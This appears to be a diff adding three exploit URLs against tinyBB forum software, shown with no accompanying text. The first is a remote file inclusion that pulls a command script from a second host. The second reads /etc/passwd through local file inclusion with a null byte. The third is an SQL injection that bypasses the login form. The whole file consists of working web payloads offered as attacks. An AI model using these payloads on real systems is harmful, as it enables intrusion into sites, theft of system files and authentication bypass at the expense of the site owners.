@@ -1,0 +1,3 @@
+http://www.example.com/[tBBPath]/footers.php?tinybb_footers=http://www.example2.com/cmd.txt?
+http://www.example.com/[tBBPath]/footers.php?tinybb_footers=/etc/passwd%00
+http://www.example.com/[tBBPath]/login.php?username=heh/**/or/**/isnull(1/0)/*&amp;password=nothing
